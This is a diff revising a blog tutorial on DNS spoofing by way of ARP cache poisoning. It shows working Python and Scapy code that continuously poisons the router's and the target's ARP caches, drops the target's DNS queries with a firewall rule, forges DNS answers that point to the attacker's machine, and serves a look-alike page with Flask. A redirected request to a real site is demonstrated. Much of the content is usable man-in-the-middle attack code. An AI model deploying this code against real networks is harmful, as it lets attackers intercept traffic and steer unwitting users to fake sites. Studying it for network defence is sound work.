@@ -13,8 +13,7 @@ tags:
 ---
 
 # Introduction
-In my previous post, we had a look at poisoning ARP caches which allowed us to intercept messages
-being sent to and from the target. In this post, we utilize that to intercept all DNS requests of the
+In my previous [post][arp], we had a look at poisoning ARP caches which allowed us to intercept the target's traffic. In this post, we build on that to intercept all DNS requests of the
 target and provide a spoofed reply pointing to a web server running on our machine.
 
 # DNS
@@ -29,23 +28,26 @@ the nameservers till it receives a response from the nameserver responsible for 
 Once the IP address is retreived, the client sends the HTTP request and displays the page returned.
 
 # DNS Spoofing
-Since we need the target's traffic to pass through our system, we need to poison both the router's and target's ARP cache. This can be done in the following manner.
+Before we can send spoofed responses to the target, we need the target's traffic to pass through our system. This is done by poisoning both the router's and target's ARP cache. The following code shows how this can be done.
 
 ```python
-# Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
-send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac), verbose=0)
+while True:
+  # Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
+  send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac), verbose=0)
 
-# Poison target's cache
-send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac), verbose=0)
+  # Poison target's cache
+  send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac), verbose=0)
 
-# Sleep to prevent flooding
-time.sleep(2)
+  # Sleep to prevent flooding
+  time.sleep(2)
 ```
 
-Once we poison the ARP caches, the target's traffic passes through our system. Now we can control the traffic, i.e., we can decide on what to forward and what not to. By stopping all DNS queries from the target, we can then send a spoofed DNS response pointing to our system. This will cause the target to send an HTTP request to our machine. We can stop forwarding all DNS messages in the following manner.
+By continously sending spoofed ARP responses, we poison the ARP caches. Now we control the traffic, i.e., we can decide on what to forward and what not to. By stopping all DNS queries from the target, we can then send a spoofed DNS response pointing to our system. This will cause the target to send all future HTTP/HTTPS requests to our machine. 
+
+To stop forwarding all DNS messages, we need to drop them adding a firewall rule. This is carried out
+in the following manner.
 
 ```python
-print("Enabling IP forwarding")
 # Check to see if we are on linux
 if (platform.system() == "Linux"):
   # Enable IP forwarding
@@ -60,7 +62,7 @@ if (platform.system() == "Linux"):
   Popen([firewall], shell=True, stdout=PIPE)
 ```
 
-Now, since all the DNS messages are dropped, we need to provide the target with a spoofed DNS response. Failing to do so can lead to DOS since the target will not be able to resolve the URL to any IP address. We can send a spoofed DNS answer in the following manner.
+Now, since all DNS messages from the target are dropped, we need to provide the target with a spoofed DNS response. Failing to do so can lead to a DOS since the target will not be able to resolve the URL to any IP address. To send a spoofed DNS answer, we can use the following code.
 
 ```python
 if (pkt[IP].src == g_target_ip and
@@ -102,7 +104,7 @@ if (pkt[IP].src == g_target_ip and
   print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {g_server_ip}")
 ```
 
-In the above code, *pkt* holds the DNS request intercepted by our machine. Using it, we send a DNS response saying that the URL maps to our IP address. Now since the target will start sending HTTP/HTTPS request to our machine, we need to respond to those with our webpage. A simple demonstration can be shown using Flask in the following manner.
+In the above code, *pkt* holds the DNS request intercepted by our machine. Using it, we send a DNS response saying that the URL maps to our IP address. Now since the target will start sending HTTP/HTTPS request to our machine, we need to respond to those with our webpage. A simple demonstration can be done using Flask in the following manner.
 
 ```python
 from flask import Flask
@@ -131,8 +133,9 @@ Once the DNS hijacker and the web server are started, sending a request from my 
 
 ![pwned](../../assets/videos/pwned.gif)
 
-We can see that a GET request to `victoria.dev` was successfully redirected to our webpage. yaaa. Note that the warning can be removed by supplying phony certificates, but that topic is for another post.
+We can see that a GET request to `xda-developers.com` was successfully redirected to our webpage. yaaa. Note that the warning can be removed by supplying phony certificates (hard!), but that topic is for another post.
 
 The full script is available on my github [page][page].
 
 [page]: https://github.com/venkat-abhi/dns-redirector
+[arp]: https://fsec404.github.io/blog/arp-cache-poisoning-and-mitm/
